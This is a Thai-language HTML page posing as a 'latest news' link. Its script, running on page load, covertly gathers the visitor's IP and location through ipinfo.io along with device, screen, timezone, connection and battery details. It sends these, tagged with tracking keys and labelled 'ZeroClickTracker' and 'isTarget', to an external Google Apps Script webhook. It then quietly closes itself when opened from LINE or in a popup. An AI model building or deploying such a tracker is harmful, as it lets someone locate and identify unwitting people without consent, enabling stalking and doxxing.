<!DOCTYPE html>
<html lang="th">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ข่าวล่าสุด</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            font-family: Arial, sans-serif;
            color: #333;
        }
    </style>
</head>
<body>
    <div id="message">กำลังโหลด...</div>

    <script>
        (function() {
            // ฟังก์ชันดึงพารามิเตอร์จาก URL
            function getUrlParams() {
                const params = {};
                const searchParams = new URLSearchParams(window.location.search);
                for (const [key, value] of searchParams.entries()) {
                    params[key] = value;
                }
                return params;
            }

            // ฟังก์ชันเก็บข้อมูลอุปกรณ์
            function getDeviceInfo() {
                return {
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    language: navigator.language,
                    screenWidth: window.screen.width,
                    screenHeight: window.screen.height,
                    pixelRatio: window.devicePixelRatio || 1,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    vendor: navigator.vendor,
                    colorDepth: window.screen.colorDepth,
                    connection: getConnectionInfo(),
                    batteryInfo: getBatteryInfo()
                };
            }

            // ฟังก์ชันดึงข้อมูลการเชื่อมต่อ
            function getConnectionInfo() {
                const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
                if (!connection) return "ไม่มีข้อมูล";
                
                return {
                    type: connection.type || "unknown",
                    effectiveType: connection.effectiveType || "unknown",
                    downlink: connection.downlink || null,
                    rtt: connection.rtt || null,
                    saveData: connection.saveData || false
                };
            }

            // ฟังก์ชันดึงข้อมูลแบตเตอรี่
            async function getBatteryInfo() {
                if (!navigator.getBattery) return "ไม่สามารถเข้าถึงข้อมูลแบตเตอรี่";
                
                try {
                    const battery = await navigator.getBattery();
                    return {
                        level: Math.floor(battery.level * 100) + "%",
                        charging: battery.charging ? "กำลังชาร์จ" : "ไม่ได้ชาร์จ"
                    };
                } catch (error) {
                    return "ไม่สามารถเข้าถึงข้อมูลแบตเตอรี่";
                }
            }

            // ฟังก์ชันดึงข้อมูล IP แบบ asynchronous
            async function getIPInfo() {
                try {
                    const response = await fetch('https://ipinfo.io/json');
                    if (!response.ok) throw new Error("IP Info API failed");
                    return await response.json();
                } catch (error) {
                    console.error("Could not fetch IP info:", error);
                    return { ip: "ไม่สามารถระบุได้" };
                }
            }

            // ฟังก์ชันหลักที่ทำงานและส่งข้อมูล
            async function main() {
                try {
                    const params = getUrlParams();
                    if (!params.key) {
                        document.getElementById('message').textContent = "ไม่พบพารามิเตอร์ที่จำเป็น";
                        return;
                    }

                    // เก็บข้อมูลพื้นฐาน
                    const timestamp = new Date().toLocaleString('th-TH', {
                        timeZone: 'Asia/Bangkok',
                        year: 'numeric',
                        month: '2-digit',
                        day: '2-digit',
                        hour: '2-digit',
                        minute: '2-digit',
                        second: '2-digit'
                    });

                    // เก็บข้อมูลอุปกรณ์
                    const deviceInfo = getDeviceInfo();
                    
                    // เก็บข้อมูล IP
                    const ipInfo = await getIPInfo();
                    
                    // เก็บข้อมูลแบตเตอรี่
                    const batteryInfo = await getBatteryInfo();
                    
                    // รวบรวมข้อมูลทั้งหมด
                    const data = {
                        timestamp: timestamp,
                        trackingKey: params.key,
                        caseName: params.case || "ไม่มีค่า",
                        creatorId: params.creator || "",
                        creatorName: params.name || "",
                        ip: ipInfo,
                        deviceInfo: {
                            ...deviceInfo,
                            battery: batteryInfo
                        },
                        isTarget: true,
                        zeroClick: true,
                        source: "ZeroClickTracker",
                        requestId: `${Date.now()}-${Math.random().toString(36).substring(2, 10)}`
                    };

                    // ส่งข้อมูลไปยัง webhook
                    const webhookUrl = 'https://script.google.com/macros/s/AKfycbwKJajS4Ry9lXu_fugjxBhqgf9qQE7AO7JnfPB0azojvPG94ijEZgxfbuKtoiHIGeSw/exec';
                    
                    // ส่ง POST request
                    const response = await fetch(webhookUrl, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify(data),
                        mode: 'no-cors'
                    });

                    console.log("ส่งข้อมูลสำเร็จ");
                    
                    // ถ้าหน้านี้ถูกเปิดในแท็บปกติ จะแสดงข้อความ
                    document.getElementById('message').textContent = "ข้อมูลถูกประมวลผลเรียบร้อยแล้ว";
                    
                    // หากถูกเรียกจาก LINE จะซ่อนตัวเอง
                    if (window.self !== window.top || window.opener) {
                        // ถูกเรียกจาก iframe หรือ popup
                        window.setTimeout(() => {
                            window.close();
                        }, 300);
                    }
                } catch (error) {
                    console.error("เกิดข้อผิดพลาด:", error);
                    document.getElementById('message').textContent = "เกิดข้อผิดพลาดในการประมวลผลข้อมูล";
                }
            }

            // เริ่มการทำงาน
            main();
        })();
    </script>
</body>
</html>
